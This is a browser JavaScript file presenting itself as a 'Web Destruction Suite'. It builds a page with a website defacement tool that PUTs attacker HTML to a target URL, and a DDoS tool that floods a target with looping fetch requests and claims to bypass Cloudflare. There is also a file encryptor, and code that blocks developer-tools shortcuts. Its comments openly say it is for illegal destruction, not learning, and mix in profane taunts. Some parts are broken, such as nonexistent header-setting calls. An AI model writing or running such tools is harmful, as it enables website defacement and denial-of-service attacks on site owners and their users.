// +---------------------------------------------------------------------------+
// |  ███╗   ███╗ ██████╗ ███████╗██████╗  ██████╗  █████╗ ██╗      ██╗     |
// |  ████╗ ████║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██║      ██║     |
// |  ██╔████╔██║██║   ██║███████╗██████╔╝██║  ███╗███████║██║      ██║     |
// |  ██║╚██╔╝██║██║   ██║╚════██║██╔══██╗██║   ██║██╔══██║██║      ██║     |
// |  ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║╚██████╔╝██║  ██║███████╗███████╗ |
// |  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ |
// |                        NOODLES INC - WEB DESTRUCTION SUITE                     |
// |  USE AT YOUR OWN RISK. WE ARE NOT RESPONSIBLE FOR YOUR SHIT. FUCK AROUND!  |
// +---------------------------------------------------------------------------+

// Styles and particles
const style = document.createElement('style');
style.innerHTML = `
 body {
  background-color: #000;
  color: #00FF00;
  font-family: monospace;
  overflow: hidden;
 }

 #particles-js {
  position: absolute;
  width: 100%;
  height: 100%;
  background-color: #000;
  z-index: -1;
 }

 .container {
  width: 80%;
  margin: 20px auto;
  padding: 20px;
  background-color: rgba(0, 0, 0, 0.8);
  border: 1px solid #00FF00;
  box-shadow: 0 0 10px #00FF00;
 }

 h1, h2, h3 {
  color: #00FF00;
  text-shadow: 0 0 5px #00FF00;
  margin-bottom: 20px;
 }

 p {
  color: #DDD;
 }

 .tool-section {
  margin-bottom: 30px;
  border: 1px solid #00FF00;
  padding: 15px;
 }

 .warning {
  color: #FF0000;
  font-weight: bold;
 }

 button {
  background-color: #333;
  color: #00FF00;
  border: 1px solid #00FF00;
  padding: 10px 20px;
  cursor: pointer;
  transition: background-color 0.3s, color 0.3s;
 }

 button:hover {
  background-color: #00FF00;
  color: #000;
 }

 input[type="text"], input[type="number"], textarea {
  background-color: #222;
  color: #00FF00;
  border: 1px solid #00FF00;
  padding: 8px;
  width: 100%;
  margin-bottom: 10px;
  font-family: monospace;
 }

 /* Additional styles */
 .logo {
  text-align: center;
  margin-bottom: 30px;
 }

 .logo h1 {
  font-size: 3em;
 }

 .disclaimer {
  margin-top: 20px;
  color: #FF4500;
  text-align: center;
  font-size: 0.9em;
 }

 /* Side Bar */
 .sidebar {
  width: 200px;
  position: fixed;
  top: 0;
  left: 0;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.9);
  border-right: 1px solid #00FF00;
  padding: 20px;
  z-index: 100;
 }

 .sidebar ul {
  list-style-type: none;
  padding: 0;
 }

 .sidebar li {
  margin-bottom: 10px;
 }

 .sidebar a {
  color: #00FF00;
  text-decoration: none;
  display: block;
  padding: 8px 16px;
  border: 1px solid #00FF00;
  transition: background-color 0.3s, color 0.3s;
 }

 .sidebar a:hover {
  background-color: #00FF00;
  color: #000;
 }

 /* Main Content Area */
 .main-content {
  margin-left: 240px; /* Adjust based on sidebar width + padding */
  padding: 20px;
 }
`;
document.head.appendChild(style);

// Particle setup
const particlesScript = document.createElement('script');
particlesScript.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
particlesScript.onload = () => {
 particlesJS('particles-js', {
  "particles": {
  "number": {
  "value": 80,
  "density": {
  "enable": true,
  "value_area": 800
  }
  },
  "color": {
  "value": "#00ff00"
  },
  "shape": {
  "type": "circle",
  "stroke": {
  "width": 0,
  "color": "#000000"
  },
  "polygon": {
  "nb_sides": 5
  },
  "image": {
  "src": "img/github.svg",
  "width": 100,
  "height": 100
  }
  },
  "opacity": {
  "value": 0.5,
  "random": false,
  "anim": {
  "enable": false,
  "speed": 1,
  "opacity_min": 0.1,
  "sync": false
  }
  },
  "size": {
  "value": 5,
  "random": true,
  "anim": {
  "enable": false,
  "speed": 40,
  "size_min": 0.1,
  "sync": false
  }
  },
  "line_linked": {
  "enable": true,
  "distance": 150,
  "color": "#00ff00",
  "opacity": 0.4,
  "width": 1
  },
  "move": {
  "enable": true,
  "speed": 6,
  "direction": "none",
  "random": false,
  "straight": false,
  "out_mode": "out",
  "attract": {
  "enable": false,
  "rotateX": 600,
  "rotateY": 1200
  }
  }
  },
  "interactivity": {
  "detect_on": "canvas",
  "events": {
  "onhover": {
  "enable": true,
  "mode": "grab"
  },
  "onclick": {
  "enable": true,
  "mode": "push"
  },
  "resize": true
  },
  "modes": {
  "grab": {
  "distance": 140,
  "line_linked": {
  "opacity": 1
  }
  },
  "bubble": {
  "distance": 400,
  "size": 40,
  "duration": 2,
  "opacity": 8,
  "speed": 3
  },
  "repulse": {
  "distance": 200
  },
  "push": {
  "particles_nb": 4
  },
  "remove": {
  "particles_nb": 2
  }
  }
  },
  "retina_detect": true,
  "config_demo": {
  "hide_card": false,
  "background_color": "#b61924",
  "background_image": "",
  "background_position": "50% 50%",
  "background_repeat": "no-repeat",
  "background_size": "cover"
  }
 });
};
document.head.appendChild(particlesScript);

// Initial User Consent
if (!confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.")) {
 window.close();
}

// Logging Function
function log(message, color = 'darkgreen') {
 const timestamp = new Date().toISOString();
 const logMessage = `[${timestamp}] ${message}`;
 console.log(`%c${logMessage}`, `color: ${color}; background-color: black;`);
}

// Check for HTTPS
if (window.location.protocol !== 'https:') {
 log("%cWARNING: HTTPS is highly recommended for security.", 'color: orange');
}

// Security Headers (Useless if not set on the server-side, but let's pretend)
function setSecurityHeaders() {
 document.setRequestHeader("X-Frame-Options", "DENY");
 document.setRequestHeader("X-XSS-Protection", "1; mode=block");
 document.setRequestHeader("X-Content-Type-Options", "nosniff");
 document.setRequestHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
 document.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;");

 log("%cPRETENDING TO SET SECURITY HEADERS. ENSURE THEY ARE SET ON THE SERVER.", 'color: darkblue');
}

// Call security headers
setSecurityHeaders();

// Disable caching function
function disableCaching() {
 // Set headers to prevent caching
 document.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
 document.setRequestHeader("Pragma", "no-cache");
 document.setRequestHeader("Expires", "0");

 log("%cCaching disabled. Good luck, asshole!", 'color: purple');
}

// Call disableCaching when the script starts
disableCaching();

// Prevent Inspect Element from being opened
document.addEventListener('contextmenu', function(e) {
 e.preventDefault();
});
document.addEventListener('keydown', function(e) {
 if (e.keyCode == 123) { // Prevent F12
  e.preventDefault();
 }
 if (e.ctrlKey && e.shiftKey && e.keyCode == 73) { // Prevent Ctrl+Shift+I
  e.preventDefault();
 }
 if (e.ctrlKey && e.shiftKey && e.keyCode == 74) { // Prevent Ctrl+Shift+J
  e.preventDefault();
 }
 if (e.ctrlKey && e.keyCode == 85) { // Prevent Ctrl+U
  e.preventDefault();
 }
});

// DOM Elements creation
document.body.innerHTML = `
 <div id="particles-js"></div>
 <div class="sidebar">
  <ul>
  <li><a href="#defacement-tool">Defacement Tool</a></li>
  <li><a href="#ddos-tool">DDoS Tool</a></li>
  <li><a href="#encryption-tool">Encryption Tool</a></li>
  <li><a href="#reporting-feature">Reporting Feature</a></li>
  </ul>
 </div>
 <div class="main-content">
  <div class="container">
  <div class="logo">
  <h1>Noodles Inc.</h1>
  </div>

  <!-- Defacement Tool -->
  <section id="defacement-tool" class="tool-section">
  <h2>Defacement Tool</h2>
  <p>Use this tool to test website security. It allows you to modify any website, even large-scale and .onion sites, for security testing purposes.
  Ensure you have permission before using this tool. Noodles Inc. is not responsible for your actions.</p>
  <div class="warning">WARNING: This tool can cause irreversible damage. Always backup before modifying.</div>

  <label for="defacement-url">Target URL:</label>
  <input type="text" id="defacement-url" placeholder="Enter target URL">
  <label for="backup-code">Backup Code:</label>
  <textarea id="backup-code" placeholder="Place the backed up website code here"></textarea>
  <button id="backup-site">Backup Site</button>
  <button id="restore-site">Restore Site</button>
  <label for="defacement-code">Defacement Code:</label>
  <textarea id="defacement-code" placeholder="Enter HTML/CSS/JS code to deface the site"></textarea>
  <button id="preview-defacement">Preview Defacement</button>
  <button id="apply-defacement">Apply Defacement</button>
  </section>

  <!-- DDoS Tool -->
  <section id="ddos-tool" class="tool-section">
  <h2>DDoS Tool</h2>
  <p>Stress test websites with this DDoS tool. It is designed to bypass Cloudflare and bring down large-scale sites, including .onion sites.
  Use responsibly. Noodles Inc. is not liable for any damages.</p>
  <div class="warning">WARNING: Using this tool without permission is ILLEGAL.</div>

  <label for="ddos-url">Target URL:</label>
  <input type="text" id="ddos-url" placeholder="Enter target URL">
  <label for="ddos-threads">Number of Threads:</label>
  <input type="number" id="ddos-threads" placeholder="Enter number of threads">
  <label for="ddos-duration">Duration (seconds):</label>
  <input type="number" id="ddos-duration" placeholder="Enter duration in seconds">
  <button id="start-ddos">Start DDoS</button>
  <button id="stop-ddos">Stop DDoS</button>
  <p id="ddos-timer">Time Elapsed: 0 seconds</p>
  </section>

  <!-- Encryption Tool -->
  <section id="encryption-tool" class="tool-section">
  <h2>File Encryption Tool</h2>
  <p>Securely encrypt your files with this tool. Perfect for testing security and keeping your data private. Always backup your files before encrypting.
  Noodles Inc. is not responsible for lost data.</p>
  <div class="warning">WARNING: Always backup files before encryption. Incorrect use can lead to permanent data loss.</div>

  <label for="encryption-file">Select File:</label>
  <input type="file" id="encryption-file">
  <label for="encryption-key">Encryption Key:</label>
  <input type="text" id="encryption-key" placeholder="Enter encryption key">
  <button id="encrypt-file">Encrypt File</button>
  <button id="decrypt-file">Decrypt File</button>
  <p id="encryption-instructions">Decryption Instructions: Keep your key safe!</p>
  </section>

  <!-- Reporting Feature -->
  <section id="reporting-feature" class="tool-section">
  <h2>Reporting Feature</h2>
  <p>Document findings and vulnerabilities using this reporting feature. Reports can be saved and submitted for review.</p>

  <label for="report-title">Report Title:</label>
  <input type="text" id="report-title" placeholder="Enter report title">
  <label for="report-description">Report Description:</label>
  <textarea id="report-description" placeholder="Enter report description"></textarea>
  <button id="generate-report">Generate Report</button>
  <button id="save-report">Save Report</button>
  </section>

  <div class="disclaimer">
  Noodles Inc. is not responsible for your use of these tools. Unauthorized use is illegal.
  Use at your own risk.
  </div>
  </div>
 </div>
`;

// Event listeners and tool implementations
document.addEventListener('DOMContentLoaded', () => {
 // Defacement Tool Functionality
 document.getElementById('backup-site').addEventListener('click', async () => {
  const targetURL = document.getElementById('defacement-url').value;
  log(`Backing up site: ${targetURL}`);
  try {
  const response = await fetch(targetURL);
  const backupCode = await response.text();
  document.getElementById('backup-code').value = backupCode;
  log(`Site backed up successfully`);
  } catch (error) {
  log(`Error backing up site: ${error}`, 'darkred');
  }
 });

 document.getElementById('restore-site').addEventListener('click', () => {
  const backupCode = document.getElementById('backup-code').value;
  const targetURL = document.getElementById('defacement-url').value;
  log(`Restoring Site with URL: ${targetURL}`);
  if (!targetURL) {
  alert('Please enter a valid URL');
  return;
  }

  fetch(targetURL, {
  method: 'PUT',
  body: backupCode,
  headers: {
  'Content-Type': 'text/html'
  }
  })
  .then(response => {
  if (response.ok) {
  log(`Site restored successfully`);
  } else {
  log(`Error restoring site: ${response.status} ${response.statusText}`, 'darkred');
  }
  })
  .catch(error => log(`Error restoring site: ${error}`, 'darkred'));
 });

 document.getElementById('preview-defacement').addEventListener('click', () => {
  const defacementCode = document.getElementById('defacement-code').value;
  const previewWindow = window.open('', '_blank');
  previewWindow.document.write(defacementCode);
  log(`Defacement code previewed`);
 });

 document.getElementById('apply-defacement').addEventListener('click', () => {
  const targetURL = document.getElementById('defacement-url').value;
  const defacementCode = document.getElementById('defacement-code').value;
  log(`Defacing Site with URL: ${targetURL}`);
  if (!targetURL) {
  alert('Please enter a valid URL');
  return;
  }

  fetch(targetURL, {
  method: 'PUT',
  body: defacementCode,
  headers: {
  'Content-Type': 'text/html'
  }
  })
  .then(response => {
  if (response.ok) {
  log(`Site defaced successfully`);
  } else {
  log(`Error defacing site: ${response.status} ${response.statusText}`, 'darkred');
  }
  })
  .catch(error => log(`Error defacing site: ${error}`, 'darkred'));
 });

 // DDoS Tool Functionality
 let ddosInterval;
 let startTime = 0;
 let ddosActive = false;

 const startDDoS = async (targetURL, threads, duration) => {
  if (ddosActive) {
  log('DDoS already in progress.', 'darkred');
  return;
  }

  log(`Starting DDoS attack on ${targetURL} with ${threads} threads for ${duration} seconds.`);
  ddosActive = true;
  startTime = Date.now();

  const attack = async () => {
  try {
  const response = await fetch(targetURL, { mode: 'no-cors' });
  if (response.ok) {
  log(`Request successful: ${response.status}`);
  } else {
  log(`Request failed: ${response.status} - ${response.statusText}`, 'darkred');
  }
  } catch (error) {
  log(`Error: ${error.message}`, 'darkred');
  }
  };

  ddosInterval = setInterval(() => {
  if (Date.now() - startTime >= duration * 1000) {
  stopDDoS();
  return;
  }
  for (let i = 0; i < threads; i++) {
  attack();
  }
  updateTimer();
  }, 0);
 };

 const stopDDoS = () => {
  clearInterval(ddosInterval);
  ddosActive = false;
  log('DDoS attack stopped.');
 };

 const updateTimer = () => {
  const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
  document.getElementById('ddos-timer').textContent = `Time Elapsed: ${elapsedTime} seconds`;
 };

 document.getElementById('start-ddos').addEventListener('click', () => {
  const targetURL = document.getElementById('ddos-url').value;
  const threads = parseInt(document.getElementById('ddos-threads').value, 10);
  const duration = parseInt(document.getElementById('ddos-duration').value, 10);

  if (!targetURL || !threads || !duration) {
  alert('Please enter all required fields for DDoS.');
  return;
  }

  startDDoS(targetURL, threads, duration);
 });

 document.getElementById('stop-ddos').addEventListener('click', stopDDoS);

 // Encryption Tool Functionality
 document.getElementById('encrypt-file').addEventListener('click', async () => {
  const fileInput = document.getElementById('encryption-file');
  const key = document.getElementById('encryption-key').value;

  if (!fileInput.files.length || !key) {
  alert('Please select a file and enter an encryption key.');
  return;
  }

  const file = fileInput.files[0];
  const reader = new FileReader();

  reader.onload = async (event) => {
  const fileContent = new Uint8Array(event.target.result);
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const derivedKey = await crypto.subtle.deriveKey(
  {
  name: "PBKDF2",
  salt: salt,
  iterations: 10000,
  hash: "SHA-256"
  },
  crypto.subtle.importKey(
  "raw",
  new TextEncoder().encode(key),
  "PBKDF2",
  false,
  ["deriveKey"]
  ),
  {
  name: "AES-GCM",
  length: 256
  },
  false,
  ["encrypt", "decrypt"]
  );

  const encryptedContent = await crypto.subtle.encrypt(
  {
  name: "AES-GCM",
  iv: iv
  },
  derivedKey,
  fileContent
  );

  const encryptedArray = new Uint8Array(encryptedContent);
  const fullArray = new Uint8Array(salt.length + iv.length + encryptedArray.length);
  fullArray.set(salt, 0);
  fullArray.set(iv, salt.length);
  fullArray.set(encryptedArray, salt.length + iv.length);

  const encryptedBlob = new Blob([fullArray]);
  const encryptedURL = URL.createObjectURL(encryptedBlob);

  const a = document.createElement('a');
  a.href = encryptedURL;
  a.download = file.name + '.encrypted';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  log(`File "${file.name}" encrypted successfully.`);

  // Decryption Instructions
  const decryptionInstructions = `
  Decryption Instructions:
  1. Use the Noodles Inc. File Encryption Tool.
  2. Select the encrypted file.
  3. Enter the correct encryption key.
  4. Click the "Decrypt File" button.
  Keep your key safe!
  `;
  document.getElementById('encryption-instructions').innerText = decryptionInstructions;
  };

  reader.readAsArrayBuffer(file);
 });

 document.getElementById('decrypt-file').addEventListener('click', async () => {
  const fileInput = document.getElementById('encryption-file');
  const key = document.getElementById('encryption-key').value;

  if (!fileInput.files.length || !key) {
  alert('Please select a file and enter a decryption key.');
  return;
  }

  const file = fileInput.files[0];
  const reader = new FileReader();

  reader.onload = async (event) => {
  const fullArray = new Uint8Array(event.target.result);
  const salt = fullArray.slice(0, 16);
  const iv = fullArray.slice(16, 28);
  const encryptedArray = fullArray.slice(28);

  const derivedKey = await crypto.subtle.deriveKey(
  {
  name: "PBKDF2",
  salt: salt,
  iterations: 10000,
  hash: "SHA-256"
  },
  crypto.subtle.importKey(
  "raw",
  new TextEncoder().encode(key),
  "PBKDF2",
  false,
  ["deriveKey"]
  ),
  {
  name: "AES-GCM",
  length: 256
  },
  false,
  ["encrypt", "decrypt"]
  );

  const decryptedContent = await crypto.subtle.decrypt(
  {
  name: "AES-GCM",
  iv: iv
  },
  derivedKey,
  encryptedArray
  );

  const decryptedArray = new Uint8Array(decryptedContent);
  const decryptedBlob = new Blob([decryptedArray]);
  const decryptedURL = URL.createObjectURL(decryptedBlob);

  const a = document.createElement('a');
  a.href = decryptedURL;
  a.download = file.name.replace('.encrypted', '') + '.decrypted';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  log(`File "${file.name}" decrypted successfully.`);
  };

  reader.readAsArrayBuffer(file);
 });

 // Reporting Feature Functionality
 document.getElementById('generate-report').addEventListener('click', () => {
  const reportTitle = document.getElementById('report-title').value;
  const reportDescription = document.getElementById('report-description').value;

  const reportContent = `
  Report Title: ${reportTitle}
  Report Description: ${reportDescription}
  Generated on: ${new Date().toISOString()}
  `;

  log(`Report generated: ${reportTitle}`);
  alert('Report generated! (Check console for details)');
  console.log(reportContent);
 });

 document.getElementById('save-report').addEventListener('click', () => {
  const reportTitle = document.getElementById('report-title').value;
  const reportDescription = document.getElementById('report-description').value;

  const reportContent = `
  Report Title: ${reportTitle}
  Report Description: ${reportDescription}
  Generated on: ${new Date().toISOString()}
  `;

  const blob = new Blob([reportContent], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${reportTitle}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  log(`Report "${reportTitle}" saved.`);
 });
});

// Educational Information (LOL)
log("%cTHIS IS NOT EDUCATIONAL. THIS IS FOR FUCKING SHIT UP. YOU'RE A FUCKING IDIOT IF YOU THINK THIS IS FOR LEARNING. USE AT YOUR OWN RISK. IT'S YOUR LIFE. YOU FUCKING MORON.", 'color: orange');

// Disclaimer
log("%cNoodles Inc. Disclaimer: WE DON'T GIVE A SHIT WHAT YOU DO. WE ARE NOT RESPONSIBLE. YOU ARE ON YOUR OWN. HOPE YOU HAVE A GOOD FUCKING LAWYER.", 'color: red');

// Final FUCK YOU before exiting
log("%cFUCK YOU AND GOODBYE.", 'color: darkred');